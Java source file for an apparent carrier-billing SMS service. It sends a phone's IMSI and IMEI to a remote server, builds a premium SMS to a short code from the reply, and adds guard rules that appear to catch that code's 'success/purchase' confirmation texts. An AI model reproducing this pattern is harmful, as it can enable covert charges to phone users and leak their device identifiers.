package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import sun.misc.BASE64Decoder;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class XxcWo2DynamicService implements IDynamicService{
	
	private static final String TYPE = "xxcWo2";
	
	private static final String REQUESTMODEL = "serviceId={serviceId}&timeStamp={timeStamp}&imsi={imsi}&imei={imei}&callbackData={callbackData}";
	private static final Guard guard1 = new Guard("10655477","成功|购买",1440,"1",0);
	private static final Guard guard2 = new Guard("10655477","",960,null,1);
	private static final Integer DEFAULTSUCCESSTIMEOUT = 10;
	private int timeOut = 60;
	
	private static SimpleDateFormat sdf = new SimpleDateFormat();
	
	static{
		sdf.applyPattern("yyMMddHHmmss");
	}
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String serviceId = map.get("serviceId");
			String imsi = map.get("imsi");
			String imei = map.get("imei");
			
			String timeStamp = sdf.format(new Date());
			
			String param = REQUESTMODEL.replace("{serviceId}", serviceId);
			param = param.replace("{imsi}", imsi);
			param = param.replace("{imei}", imei);
			param = param.replace("{callbackData}", channel);
			param = param.replace("{timeStamp}", timeStamp);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parseTxt(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
			
		}
		
		return xml;
	}
	
	/**
	 * sms=bb4d1c64bb9c894b38ea0d96f933f1d5b9ba6ed49f9f7ee0f7bbd5d3d1769330aa16b9264102b31c36046425c2e9a5fce3637b9ce843259bf3d95f065bf3bd8f$accessNo=10655477477477
	 * @param responseTxt
	 * @return
	 */
	private String parseTxt(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			responseTxt = responseTxt.replaceAll("\r\n", "");
			String[] arr = responseTxt.split("\\$");
			
			if(arr.length ==2 && arr[0].startsWith("sms=") && arr[1].startsWith("accessNo=")){
				String smsContent = arr[0].substring(4);
				String accessNo = arr[1].substring(9);
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(smsContent);
				sms.setSmsDest(accessNo);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);

				return XstreamHelper.toXml(smsList);
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		Map<String,String> map = new HashMap<String, String>();
 		
		map.put("url","http://121.37.59.124:15081/sms/interface/get/get_fl_and_mc_mo.jsp");
		map.put("channel","10B101a087654322");
		map.put("imsi","460017402063064");
		map.put("imei","862012020094373");
		map.put("serviceId","60064");
		
		String xml = new XxcWo2DynamicService().dynamic(map);
		
		System.out.println(xml);
		
//		System.out.println(sdf.format(new Date()));
	}

}
